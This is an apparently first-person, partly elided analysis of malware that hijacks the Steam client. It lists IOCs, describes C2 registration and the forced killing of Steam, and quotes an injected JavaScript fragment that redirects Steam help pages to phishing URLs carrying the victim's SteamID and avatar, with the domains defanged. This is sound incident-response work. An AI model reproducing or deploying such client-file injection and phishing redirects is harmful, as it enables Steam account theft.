...
**The victim (me):**
- SteamID64: `[REDACTED_STEAMID64]` (already reported to C2 — password changed, Steam Guard enabled)
...
│   • Registers victim with C2 (example[.]invalid)            │
│   • Force-kills Steam process (no shutdown dialog)              │
│   • Injects ~110 bytes into chunk~2dcc5aaf7.js → ResolveURL()   │
│     ⎯ HelpAppPage → example[.]invalid/steamhelper           │
│     ⎯ HelpFrontPage → example[.]invalid/steamhelper         │
│     ⎯ SupportMessages → example[.]invalid/steamhelper.html  │
...
// --- Injected malware code ---
    ,_h="https://example[.]invalid/steamhelper?d=[REDACTED_STEAMID64]&a=[REDACTED_AVATAR]",
    _s="https://example[.]invalid/steamhelper.html?u=[REDACTED_ACCOUNT]&d=[REDACTED_STEAMID64]&a=[REDACTED_AVATAR]";
...
|------|-------|-------------|
| `domain` | `example[.]invalid` | C2 & phishing host (Cloudflare CDN) |
| `domain` | `example[.]invalid/steamhelper` | Phishing page (with SteamID64 param) |
| `domain` | `example[.]invalid/steamhelper.html` | Backup phishing page |
...
| `steamid` | `[REDACTED_STEAMID64]` | Victim SteamID64 (hardcoded in C2 URLs) |
| `file_path` | `[DRIVE_ROOT]/Windows\System32\merged_steam.py` | Malicious Python script |
...
│  │ example[.]invalid │ │ Phase 0 → Phase 1 →         │   │
│  │ ■ DISCONNECTED        │ │        ↓        ↓           │   │
│  │                       │ │ Phase 2 → Phase 3           │   │
│  │ Infection: 23h        │ │                            │   │
